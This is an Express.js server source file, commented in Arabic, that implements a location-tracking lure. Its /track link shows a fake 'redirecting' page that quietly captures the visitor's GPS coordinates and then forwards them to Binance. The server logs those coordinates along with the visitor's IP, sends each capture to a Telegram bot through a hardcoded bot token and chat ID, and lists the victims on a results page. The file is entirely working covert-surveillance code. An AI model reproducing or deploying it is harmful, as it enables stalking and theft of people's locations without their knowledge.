const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// إعداداتك - ضعها هنا
const TELEGRAM_TOKEN = '8266899631:AAEUxiahvm8gnAreYXVS0Zjj5d153D7Ab-Y';
const TELEGRAM_CHAT_ID = '8391968596';
const REDIRECT_URL = 'https://www.binance.com/en';
const BASE_URL = 'https://location2026-2.onrender.com';

let locations = [];

app.use(express.json());

// الصفحة الرئيسية
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html dir="rtl">
        <head>
            <meta charset="UTF-8">
            <title>🚀 نظام التتبع</title>
            <style>
                body { font-family: Arial; padding: 20px; background: #0f0f23; color: white; }
                h1 { color: #00ff88; text-align: center; }
                .btn { background: #00cc66; color: white; padding: 12px 20px; border-radius: 5px; text-decoration: none; margin: 5px; }
            </style>
        </head>
        <body>
            <h1>🚀 نظام تتبع المواقع</h1>
            <p>مرحباً! النظام يعمل الآن بشكل صحيح ✅</p>
            
            <p><a href="/track/123456" class="btn">🔗 تجربة رابط تتبع</a></p>
            <p><a href="/results" class="btn">📊 النتائج (${locations.length})</a></p>
            <p><a href="/test-telegram" class="btn">🤖 اختبار التلجرام</a></p>
            
            <p style="margin-top: 30px; font-size: 12px;">
                البوت: @Arab9919_bot | الأيدي: ${TELEGRAM_CHAT_ID}
            </p>
        </body>
        </html>
    `);
});

// رابط التتبع
app.get('/track/:id', (req, res) => {
    const userId = req.params.id;
    
    res.send(`
        <!DOCTYPE html>
        <html dir="rtl">
        <head>
            <meta charset="UTF-8">
            <title>جاري التحويل...</title>
            <script>
                // محاولة الحصول على الموقع
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(async (position) => {
                        await fetch('/api/save-location', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                id: '${userId}',
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                accuracy: position.coords.accuracy,
                                timestamp: new Date().toISOString()
                            })
                        });
                    });
                }
                
                // التوجيه بعد 3 ثواني
                setTimeout(() => {
                    window.location.href = '${REDIRECT_URL}';
                }, 3000);
            </script>
            <style>
                body {
                    font-family: Arial;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    background: linear-gradient(135deg, #1a2980 0%, #26d0ce 100%);
                    color: white;
                    text-align: center;
                }
                .loader {
                    border: 5px solid #f3f3f3;
                    border-top: 5px solid #00ff88;
                    border-radius: 50%;
                    width: 50px;
                    height: 50px;
                    animation: spin 1s linear infinite;
                    margin: 20px auto;
                }
                @keyframes spin {
                    0% { transform: rotate(0deg); }
                    100% { transform: rotate(360deg); }
                }
            </style>
        </head>
        <body>
            <div>
                <h1>جاري التحويل...</h1>
                <div class="loader"></div>
                <p>سيتم توجيهك خلال 3 ثوانٍ</p>
            </div>
        </body>
        </html>
    `);
});

// حفظ الموقع
app.post('/api/save-location', async (req, res) => {
    try {
        const locationData = {
            ...req.body,
            ip: req.ip,
            time: new Date().toLocaleString('ar-SA')
        };
        
        locations.push(locationData);
        
        // إرسال تلجرام
        await sendTelegram(locationData);
        
        res.json({ success: true, count: locations.length });
    } catch (error) {
        res.json({ success: false });
    }
});

// دالة إرسال تلجرام
async function sendTelegram(locationData) {
    try {
        const message = `📍 موقع جديد: ${locationData.id}
📌 ${locationData.latitude}, ${locationData.longitude}
⏰ ${locationData.time}`;
        
        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message
            })
        });
        
        return true;
    } catch (error) {
        console.log('❌ خطأ تلجرام:', error.message);
        return false;
    }
}

// اختبار التلجرام
app.get('/test-telegram', async (req, res) => {
    try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: '✅ اختبار النظام\n🎉 النظام يعمل الآن بشكل صحيح!'
            })
        });
        
        const data = await response.json();
        
        res.send(`
            <html dir="rtl">
            <body style="font-family: Arial; padding: 50px; text-align: center;">
                <h1>${data.ok ? '✅ نجاح' : '❌ خطأ'}</h1>
                <pre>${JSON.stringify(data, null, 2)}</pre>
                <a href="/" style="background: #00cc66; color: white; padding: 10px 20px; border-radius: 5px; text-decoration: none;">العودة</a>
            </body>
            </html>
        `);
    } catch (error) {
        res.send(`خطأ: ${error.message}`);
    }
});

// صفحة النتائج
app.get('/results', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html dir="rtl">
        <head>
            <title>📊 النتائج</title>
            <style>
                body { font-family: Arial; padding: 20px; }
                table { width: 100%; border-collapse: collapse; }
                th, td { padding: 10px; border: 1px solid #ddd; }
            </style>
        </head>
        <body>
            <h1>📊 النتائج (${locations.length})</h1>
            <a href="/">🏠 الرئيسية</a>
            <table>
                <tr><th>رقم</th><th>الإحداثيات</th><th>الوقت</th></tr>
                ${locations.slice().reverse().map(loc => `
                    <tr>
                        <td>${loc.id}</td>
                        <td>${loc.latitude}, ${loc.longitude}</td>
                        <td>${loc.time}</td>
                    </tr>
                `).join('')}
            </table>
        </body>
        </html>
    `);
});

// تشغيل الخادم
app.listen(PORT, () => {
    console.log(`
    🚀 الخادم يعمل على المنفذ ${PORT}
    🌐 الرابط: http://localhost:${PORT}
    ✅ النظام جاهز!
    `);
});
